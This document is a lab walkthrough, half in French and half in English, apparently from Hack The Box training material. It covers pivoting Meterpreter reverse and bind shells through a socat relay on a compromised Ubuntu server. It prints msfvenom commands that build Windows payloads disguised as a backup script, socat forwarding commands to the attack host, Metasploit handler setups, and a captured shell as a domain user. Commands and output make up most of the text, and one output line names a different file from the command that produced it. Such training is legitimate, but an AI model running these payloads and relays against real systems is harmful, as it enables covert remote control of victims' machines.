# Socat Redirection with a Reverse Shell and Bind Shell

Socat est un outil de relais bidirectionnel qui peut créer des sockets entre deux canaux réseau indépendants sans utiliser de tunnel SSH. Il agit comme un redirigeur qui peut écouter sur une adresse et un port, puis transmettre ces données vers une autre adresse IP et un autre port. Nous pouvons démarrer l'écouteur de Metasploit en utilisant la même commande mentionnée dans la dernière section sur notre machine d'attaque, puis exécuter Socat sur le serveur Ubuntu.

#### <mark style="color:green;">Démarrage de l'écouteur Socat</mark>

```bash
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat va écouter en local sur le port 8080 et rediriger tout le trafic vers le port 80 de notre machine d'attaque (10.10.14.18). Une fois notre redirection configurée, nous pouvons créer un payload qui se connectera à notre redirection fonctionnant sur notre serveur Ubuntu. Nous devons également démarrer un écouteur sur notre machine d'attaque, car dès que Socat reçoit une connexion d'une cible, il redirige tout le trafic vers l'écouteur de notre machine d'attaque, où nous obtiendrons un shell.

#### <mark style="color:green;">Création du Payload Windows</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
{% endcode %}

Gardez à l'esprit que nous devons transférer ce payload sur l'hôte Windows. Nous pouvons utiliser certaines des techniques utilisées dans les sections précédentes pour ce faire.

#### <mark style="color:green;">Démarrage de la Console Metasploit</mark>

```bash
mrroboteLiot@htb[/htb]$ sudo msfconsole
```

#### <mark style="color:green;">Configuration et Démarrage du Multi/Handler</mark>

```bash
msf6 > use exploit/multi/handler
```

```bash
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run
```

```bash
[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

Nous pouvons tester cela en exécutant notre payload sur l'hôte Windows, et nous devrions voir une connexion réseau en provenance du serveur Ubuntu cette fois-ci.

```bash
meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

***

## <mark style="color:red;">Socat Redirection with a Bind Shell</mark>

Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. The below figure should explain the pivot in a much better way.

![](https://academy.hackthebox.com/storage/modules/158/55.png)

We can create a bind shell using msfvenom with the below command.

<mark style="color:green;">**Creating the Windows Payload**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe
```
{% endcode %}

We can start a `socat bind shell` listener, which listens on port `8080` and forwards packets to Windows server `8443`.

<mark style="color:green;">**Starting Socat Bind Shell Listener**</mark>

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)

<mark style="color:green;">**Configuring & Starting the Bind multi/handler**</mark>

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.
